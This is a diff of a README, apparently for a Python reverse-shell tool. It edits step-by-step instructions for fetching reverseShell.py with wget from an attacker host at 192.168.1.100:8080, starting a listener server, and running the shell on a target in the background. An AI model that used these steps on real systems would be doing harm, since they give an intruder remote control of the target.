@@ -21,11 +21,11 @@ Then use the wget command to download the payload onto the system from the serve
     kali> wget 192.168.1.100:8080/reverseShell.py
 ![delivery](https://github.com/user-attachments/assets/dc80e3f0-4619-4098-96cf-d98c94342d67)
 
-Start the server on the attacker machine using
+Start the server on the attacker machine:
 
     kali> python3 server.py
 
-Then execute the reverse shell onthe hacker
+Then execute the reverse shell onthe target:
 
     kali> python reserseShell.py 192.168.1.100 &                      Note: The & operator in bash is used to background a process.
 ![execute on target](https://github.com/user-attachments/assets/c9740c2c-33bd-4d0c-ba5e-ecddd269becc)
